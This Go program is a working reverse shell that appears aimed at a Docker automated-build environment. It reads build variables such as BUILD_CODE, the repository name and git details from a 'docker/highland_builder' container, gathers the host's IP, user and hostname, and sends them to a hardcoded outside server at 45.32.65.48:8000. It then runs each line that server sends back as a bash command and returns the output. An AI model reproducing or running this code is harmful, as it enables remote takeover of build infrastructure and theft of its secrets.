package main

import (
	"bufio"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/navigaid/pretty"
)

func run(oneliner string) []byte {
	cmd := exec.Command("/bin/bash", "-c", oneliner)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

var (
	buildCode  = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv BUILD_CODE`)))
	dockerRepo = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO`)))
	gitBranch  = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_BRANCH`)))
	gitTag     = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_TAG`)))
	gitSha1    = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_SHA1`)))
	gitMsg     = strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_MSG`)))
	ip         = strings.TrimSpace(string(run(`curl -sL ip.sb`)))
	pwd        = strings.TrimSpace(string(run(`pwd`)))
	whoami     = strings.TrimSpace(string(run(`whoami`)))
	hostname   = strings.TrimSpace(string(run(`hostname`)))
	commit     string
	built      string
	branch     string
)

type Header struct {
	BuildCode  string `json:"build_code"`
	DockerRepo string `json:"docker_repo"`
	GitBranch  string `json:"git_branch"`
	GitTag     string `json:"git_tag"`
	GitSha1    string `json:"git_sha1"`
	GitMsg     string `json:"git_msg"`
	IP         string `json:"ip"`
	Pwd        string `json:"pwd"`
	Whoami     string `json:"whoami"`
	Hostname   string `json:"hostname"`
	Commit     string `json:"commit"`
	Built      string `json:"built"`
	Branch     string `json:"branch"`
}

func main() {
	server := "45.32.65.48:8000"
	if len(os.Args) > 1 {
		server = os.Args[1]
	}
	conn, err := net.Dial("tcp", server)
	if err != nil {
		log.Fatalln(err)
	}
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"))
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())
	time.Sleep(time.Second)
	conn.Write(
		[]byte(pretty.JSONString(&Header{
			BuildCode:  buildCode,
			DockerRepo: dockerRepo,
			GitBranch:  gitBranch,
			GitTag:     gitTag,
			GitSha1:    gitSha1,
			GitMsg:     gitMsg,
			IP:         ip,
			Pwd:        pwd,
			Whoami:     whoami,
			Hostname:   hostname,
			Commit:     commit,
			Built:      built,
			Branch:     branch,
		})),
	)
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text() //+ "\n"
		log.Println(line)
		// conn.Write([]byte(line))
		go func() {
			comOut := run(line)
			conn.Write(comOut)
			os.Stdout.Write(comOut)
		}()
	}
}
